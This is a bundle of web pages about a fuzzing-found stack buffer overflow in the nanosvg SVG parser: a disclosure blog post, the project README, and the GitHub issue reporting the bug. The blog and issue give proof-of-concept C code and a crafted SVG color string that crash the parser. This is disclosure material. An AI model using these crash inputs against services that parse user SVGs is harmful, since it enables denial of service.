=== Content from 0day.work_79cdd90c_20250121_011034.html ===

[![Blog Logo](https://0day.work/content/images/2016/01/0day-1.png)](https://0day.work)
##### Sebastian Neef - 0day.work

---

* [Home](https://0day.work/)
* [Contact](https://0day.work/contact/)
* [@0daywork](https://twitter.com/0daywork)
* [@gehaxelt](https://twitter.com/gehaxelt)
* [Impressum](https://it-solutions-neef.de/impressum.html)
* [Datenschutz](https://it-solutions-neef.de/datenschutz.html)

 [home](/)

---

# CVE-2019-1000032: Memory corruption / DoS in nanosvg

This is finally the first 0day-like blogpost about a memory corruption/DoS issue that I have discovered in [nanosvg](https://github.com/memononen/nanosvg/) by fuzzing it with AFL.

*UPDATE*: After my request for updating the CVE-ID, it was magically assigned `CVE-2019-1010258`.

Last year, I started to play around with [American Fuzzy Lop](http://lcamtuf.coredump.cx/afl/) and began to fuzz some open source projects from GitHub. One of those projects was [nanosvg](https://github.com/memononen/nanosvg/), a small library for working with SVG files.

After writing a small fuzz target program, I let AFL fuzz for a couple of days.

![Fuzzing overview](https://0day.work/content/images/2019/02/fuzz.png)

Eventually, AFL managed to find an input that crashes the binary within the nanosvg library.

![Crash PoC](https://0day.work/content/images/2019/02/crash.png)

As I didn't have the time and knowledge to have a deep look into the crash files and analyze them, my colleague [bitwave (Moritz Lummerzheim)](https://twitter.com/b1twave) helped me out. He created a minimal working example to trigger the bug and figured out that one can overflow a buffer using `%` or `\t` characters in the `nsvg__parseColorRGB` color function.

Here is a PoC that will trigger a segfault in the vulnerable function:

```
#include <stdio.h>
#include <string.h>
#include <float.h>
#define NANOSVG_IMPLEMENTATION
#include "./src/nanosvg.h"

int main(int argc, char const *argv[])
{
	printf("%d\n", nsvg__parseColorRGB("rgb(0%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%)"));
	return 0;
}

```

The function can also be triggered by using the library in its intended way, e.g. by passing a SVG file to `nsvgParseFromFile`:

```
int main(int argc, char const *argv[])
{
	struct NSVGimage* image;
	image = nsvgParseFromFile(argv[1], "px", 96);
}

```

The following svg is a minimal PoC that will result in a segfault:

```
<svg>
	<circle fill="rgb(0%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%)"/>
</svg>

```
```
$> ./test poc.svg
*** stack smashing detected ***: <unknown> terminated
fish: “./test poc.svg” terminated by signal SIGABRT (Abort)

```

We were unable find a way to develop a more serious exploit, we reported the problem to the develop through [issue #136](https://github.com/memononen/nanosvg/issues/136), but it seems like the dev is inactive and/or has not cared to respond.

Anyway, the best we can achieve using the bug is crashing the application with a segfault. A quick search shows that several programming languages have created packages with bindings to the nanosvg library:

* Lua: <https://github.com/iongion/lunavg>
* Python: <https://github.com/ethanhs/pynanosvg>
* Java: <https://javalibs.com/artifact/org.lwjgl/lwjgl-nanovg>
* Rust: <https://crates.rs/crates/nsvg>

So depending on the usage of those libraries, passing user-controlled SVG files to nanosvg might allow an attacker to trigger this bug.

If you manage to develop a more serious exploit or exploitation scenario, please let us know and I'll update this blogpost.

-=-

---

© 2025 [Sebastian Neef - 0day.work](https://0day.work) All rights reserved.

Coder Ghost Theme created by [Milos Bejda](https://www.mbejda.com)

Proudly published with [Ghost](https://ghost.org)

![](//piwik.neef.it/piwik.php?idsite=10&rec=1)



=== Content from github.com_5ada3198_20250121_031817.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fmemononen%2Fnanosvg%2F)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  + [Nonprofits](/solutions/industry/nonprofits)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fmemononen%2Fnanosvg%2F)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E&source=header-repo&source_repo=memononen%2Fnanosvg)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[memononen](/memononen)
/
**[nanosvg](/memononen/nanosvg)**
Public

* [Notifications](/login?return_to=%2Fmemononen%2Fnanosvg) You must be signed in to change notification settings
* [Fork
  367](/login?return_to=%2Fmemononen%2Fnanosvg)
* [Star
   1.7k](/login?return_to=%2Fmemononen%2Fnanosvg)

Simple stupid SVG parser

### License

[Zlib license](/memononen/nanosvg/blob/master/LICENSE.txt)

[1.7k
stars](/memononen/nanosvg/stargazers) [367
forks](/memononen/nanosvg/forks) [Branches](/memononen/nanosvg/branches) [Tags](/memononen/nanosvg/tags) [Activity](/memononen/nanosvg/activity)
 [Star](/login?return_to=%2Fmemononen%2Fnanosvg)

 [Notifications](/login?return_to=%2Fmemononen%2Fnanosvg) You must be signed in to change notification settings

* [Code](/memononen/nanosvg)
* [Issues
  82](/memononen/nanosvg/issues)
* [Pull requests
  44](/memononen/nanosvg/pulls)
* [Actions](/memononen/nanosvg/actions)
* [Projects
  0](/memononen/nanosvg/projects)
* [Wiki](/memononen/nanosvg/wiki)
* [Security](/memononen/nanosvg/security)
* [Insights](/memononen/nanosvg/pulse)

Additional navigation options

* [Code](/memononen/nanosvg)
* [Issues](/memononen/nanosvg/issues)
* [Pull requests](/memononen/nanosvg/pulls)
* [Actions](/memononen/nanosvg/actions)
* [Projects](/memononen/nanosvg/projects)
* [Wiki](/memononen/nanosvg/wiki)
* [Security](/memononen/nanosvg/security)
* [Insights](/memononen/nanosvg/pulse)

# memononen/nanosvg

    master[Branches](/memononen/nanosvg/branches)[Tags](/memononen/nanosvg/tags)Go to fileCode
## Folders and files

| Name | | Name | Last commit message | Last commit date |
| --- | --- | --- | --- | --- |
| Latest commit History[175 Commits](/memononen/nanosvg/commits/master/) | | |
| [example](/memononen/nanosvg/tree/master/example "example") | | [example](/memononen/nanosvg/tree/master/example "example") |  |  |
| [src](/memononen/nanosvg/tree/master/src "src") | | [src](/memononen/nanosvg/tree/master/src "src") |  |  |
| [.gitignore](/memononen/nanosvg/blob/master/.gitignore ".gitignore") | | [.gitignore](/memononen/nanosvg/blob/master/.gitignore ".gitignore") |  |  |
| [CMakeLists.txt](/memononen/nanosvg/blob/master/CMakeLists.txt "CMakeLists.txt") | | [CMakeLists.txt](/memononen/nanosvg/blob/master/CMakeLists.txt "CMakeLists.txt") |  |  |
| [Config.cmake.in](/memononen/nanosvg/blob/master/Config.cmake.in "Config.cmake.in") | | [Config.cmake.in](/memononen/nanosvg/blob/master/Config.cmake.in "Config.cmake.in") |  |  |
| [LICENSE.txt](/memononen/nanosvg/blob/master/LICENSE.txt "LICENSE.txt") | | [LICENSE.txt](/memononen/nanosvg/blob/master/LICENSE.txt "LICENSE.txt") |  |  |
| [README.md](/memononen/nanosvg/blob/master/README.md "README.md") | | [README.md](/memononen/nanosvg/blob/master/README.md "README.md") |  |  |
| [premake4.lua](/memononen/nanosvg/blob/master/premake4.lua "premake4.lua") | | [premake4.lua](/memononen/nanosvg/blob/master/premake4.lua "premake4.lua") |  |  |
| View all files | | |

## Repository files navigation

* README
* Zlib license

*This project is not actively maintained.*

# Nano SVG

## Parser

[![screenshot of some splines rendered with the sample program](/memononen/nanosvg/raw/master/example/screenshot-1.png?raw=true)](/memononen/nanosvg/blob/master/example/screenshot-1.png?raw=true)

NanoSVG is a simple stupid single-header-file SVG parse. The output of the parser is a list of cubic bezier shapes.

The library suits well for anything from rendering scalable icons in your editor application to prototyping a game.

NanoSVG supports a wide range of SVG features, but something may be missing, feel free to create a pull request!

The shapes in the SVG images are transformed by the viewBox and converted to specified units.
That is, you should get the same looking data as your designed in your favorite app.

NanoSVG can return the paths in few different units. For example if you want to render an image, you may choose
to get the paths in pixels, or if you are feeding the data into a CNC-cutter, you may want to use millimeters.

The units passed to NanoSVG should be one of: 'px', 'pt', 'pc' 'mm', 'cm', or 'in'.
DPI (dots-per-inch) controls how the unit conversion is done.

If you don't know or care about the units stuff, "px" and 96 should get you going.

## Rasterizer

[![screenshot of tiger.svg rendered with NanoSVG rasterizer](/memononen/nanosvg/raw/master/example/screenshot-2.png?raw=true)](/memononen/nanosvg/blob/master/example/screenshot-2.png?raw=true)

The parser library is accompanied with really simpler SVG rasterizer. Currently it only renders flat filled shapes.

The intended usage for the rasterizer is to for example bake icons of different size into a texture. The rasterizer is not particular fast or accurate, but it's small and packed in one header file.

## Example Usage

```
// Load
struct NSVGimage* image;
image = nsvgParseFromFile("test.svg", "px", 96);
printf("size: %f x %f\n", image->width, image->height);
// Use...
for (shape = image->shapes; shape != NULL; shape = shape->next) {
	for (path = shape->paths; path != NULL; path = path->next) {
		for (i = 0; i < path->npts-1; i += 3) {
			float* p = &path->pts[i*2];
			drawCubicBez(p[0],p[1], p[2],p[3], p[4],p[5], p[6],p[7]);
		}
	}
}
// Delete
nsvgDelete(image);
```

## Using NanoSVG in your project

In order to use NanoSVG in your own project, just copy nanosvg.h to your project.
In one C/C++ define `NANOSVG_IMPLEMENTATION` before including the library to expand the NanoSVG implementation in that file.
NanoSVG depends on `stdio.h` ,`string.h` and `math.h`, they should be included where the implementation is expanded before including NanoSVG.

```
#include <stdio.h>
#include <string.h>
#include <math.h>
#define NANOSVG_IMPLEMENTATION	// Expands implementation
#include "nanosvg.h"
```

By default, NanoSVG parses only the most common colors. In order to get support for full list of [SVG color keywords](http://www.w3.org/TR/SVG11/types.html#ColorKeywords), define `NANOSVG_ALL_COLOR_KEYWORDS` before expanding the implementation.

```
#include <stdio.h>
#include <string.h>
#include <math.h>
#define NANOSVG_ALL_COLOR_KEYWORDS	// Include full list of color keywords.
#define NANOSVG_IMPLEMENTATION		// Expands implementation
#include "nanosvg.h"
```

Alternatively, you can install the library using CMake and import it into your project using the standard CMake `find_package` command.

```
add_executable(myexe main.c)

find_package(NanoSVG REQUIRED)

target_link_libraries(myexe NanoSVG::nanosvg NanoSVG::nanosvgrast)
```

## Compiling Example Project

In order to compile the demo project, your will need to install [GLFW](http://www.glfw.org/) to compile.

NanoSVG demo project uses [premake4](http://industriousone.com/premake) to build platform specific projects, now is good time to install it if you don't have it already. To build the example, navigate into the root folder in your favorite terminal, then:

* *OS X*: `premake4 xcode4`
* *Windows*: `premake4 vs2010`
* *Linux*: `premake4 gmake`

See premake4 documentation for full list of supported build file types. The projects will be created in `build` folder. An example of building and running the example on OS X:

```
$ premake4 gmake
$ cd build/
$ make
$ ./example
```

# License

The library is licensed under [zlib license](/memononen/nanosvg/blob/master/LICENSE.txt)

## About

Simple stupid SVG parser

### Resources

[Readme](#readme-ov-file)
### License

[Zlib license](#Zlib-1-ov-file)

[Activity](/memononen/nanosvg/activity)
### Stars

[**1.7k**
stars](/memononen/nanosvg/stargazers)
### Watchers

[**82**
watching](/memononen/nanosvg/watchers)
### Forks

[**367**
forks](/memononen/nanosvg/forks)
[Report repository](/contact/report-content?content_url=https%3A%2F%2Fgithub.com%2Fmemononen%2Fnanosvg&report=memononen+%28user%29)

## [Releases](/memononen/nanosvg/releases)

No releases published

## [Packages 0](/users/memononen/packages?repo_name=nanosvg)

No packages published

## [Contributors 40](/memononen/nanosvg/graphs/contributors)

* [![@memononen](https://avatars.githubusercontent.com/u/5249992?s=64&v=4)](https://github.com/memononen)
* [![@SanCheung](https://avatars.githubusercontent.com/u/12122532?s=64&v=4)](https://github.com/SanCheung)
* [![@tamasmeszaros](https://avatars.githubusercontent.com/u/4021217?s=64&v=4)](https://github.com/tamasmeszaros)
* [![@bryanmcconkey](https://avatars.githubusercontent.com/u/6762852?s=64&v=4)](https://github.com/bryanmcconkey)
* [![@Djack1010](https://avatars.githubusercontent.com/u/17183800?s=64&v=4)](https://github.com/Djack1010)
* [![@chrismile](https://avatars.githubusercontent.com/u/1699569?s=64&v=4)](https://github.com/chrismile)
* [![@wcout](https://avatars.githubusercontent.com/u/9895976?s=64&v=4)](https://github.com/wcout)
* [![@daniel-starke](https://avatars.githubusercontent.com/u/22841069?s=64&v=4)](https://github.com/daniel-starke)
* [![@deanm](https://avatars.githubusercontent.com/u/56582?s=64&v=4)](https://github.com/deanm)
* [![@SmilyOrg](https://avatars.githubusercontent.com/u/1451391?s=64&v=4)](https://github.com/SmilyOrg)
* [![@X-Ryl669](https://avatars.githubusercontent.com/u/3277165?s=64&v=4)](https://github.com/X-Ryl669)
* [![@sezero](https://avatars.githubusercontent.com/u/4222725?s=64&v=4)](https://github.com/sezero)
* [![@chrstphrchvz](https://avatars.githubusercontent.com/u/7941193?s=64&v=4)](https://github.com/chrstphrchvz)
* [![@galibert](https://avatars.githubusercontent.com/u/9249521?s=64&v=4)](https://github.com/galibert)

[+ 26 contributors](/memononen/nanosvg/graphs/contributors)

## Languages

* [C
  97.7%](/memononen/nanosvg/search?l=c)
* [CMake
  1.4%](/memononen/nanosvg/search?l=cmake)
* [Lua
  0.9%](/memononen/nanosvg/search?l=lua)

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.



=== Content from github.com_2627210a_20250121_011036.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fmemononen%2Fnanosvg%2Fissues%2F136)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  + [Nonprofits](/solutions/industry/nonprofits)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fmemononen%2Fnanosvg%2Fissues%2F136)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Fvoltron%2Fissues_fragments%2Fissue_layout&source=header-repo&source_repo=memononen%2Fnanosvg)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[memononen](/memononen)
/
**[nanosvg](/memononen/nanosvg)**
Public

* [Notifications](/login?return_to=%2Fmemononen%2Fnanosvg) You must be signed in to change notification settings
* [Fork
  367](/login?return_to=%2Fmemononen%2Fnanosvg)
* [Star
   1.7k](/login?return_to=%2Fmemononen%2Fnanosvg)

* [Code](/memononen/nanosvg)
* [Issues
  82](/memononen/nanosvg/issues)
* [Pull requests
  44](/memononen/nanosvg/pulls)
* [Actions](/memononen/nanosvg/actions)
* [Projects
  0](/memononen/nanosvg/projects)
* [Wiki](/memononen/nanosvg/wiki)
* [Security](/memononen/nanosvg/security)
* [Insights](/memononen/nanosvg/pulse)

Additional navigation options

* [Code](/memononen/nanosvg)
* [Issues](/memononen/nanosvg/issues)
* [Pull requests](/memononen/nanosvg/pulls)
* [Actions](/memononen/nanosvg/actions)
* [Projects](/memononen/nanosvg/projects)
* [Wiki](/memononen/nanosvg/wiki)
* [Security](/memononen/nanosvg/security)
* [Insights](/memononen/nanosvg/pulse)

# CVE-2019-1000032 - Memory corruption bug in nsvg\_\_parseColorRGB #136

[New issue](/login?return_to=)[Jump to bottom](#comment-composer-heading)Copy link[New issue](/login?return_to=)[Jump to bottom](#comment-composer-heading)Copy linkClosed[#198](https://github.com/memononen/nanosvg/pull/198)Closed[CVE-2019-1000032 - Memory corruption bug in nsvg\_\_parseColorRGB](#top)#136[#198](https://github.com/memononen/nanosvg/pull/198)Copy link![@bitwave](https://avatars.githubusercontent.com/u/1345784?u=64aa72917afa2bb2907685ce09d0d80e7b10ec0d&v=4&size=80)
## Description

![@bitwave](https://avatars.githubusercontent.com/u/1345784?u=64aa72917afa2bb2907685ce09d0d80e7b10ec0d&v=4&size=48)[bitwave](https://github.com/bitwave)opened [on Nov 16, 2018](https://github.com/memononen/nanosvg/issues/136#issue-381637983)

This simple Proof of Concept

```
<stop style="stop-color:rgb(0%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%)"/>

```

crashes nanosvg.

In this snippet it is clear why this happens:

```
#include <stdio.h>
#include <string.h>

static unsigned int nsvg__parseColorRGB(const char* str)
{
	int r = -1, g = -1, b = -1;
	char s1[32]="", s2[32]="";
	sscanf(str + 4, "%d%[%%, \t]%d%[%%, \t]%d", &r, s1, &g, s2, &b);
	if (strchr(s1, '%')) {
		return 1;
	} else {
		return 0;
	}
}

int main(int argc, char const *argv[])
{
	printf("%d\n", nsvg__parseColorRGB("rgb(0%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%)"));
	return 0;
}
```

sscanf tries to parse the string, and writes arbitrary number of '%' or '\t' into the s1 or s2 buffer. The buffer overflows and triggers a segfault. This could lead to memory corruption and/or denial of service.

Regards

bitwave

CC: [@gehaxelt](https://github.com/gehaxelt) for the fuzzing

## Metadata

### Assignees

No one assigned

### Labels

No labelsNo labels
### Projects

No projects
### Milestone

No milestone

### Relationships

None yet
### Development

No branches or pull requests
## Issue actions

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.


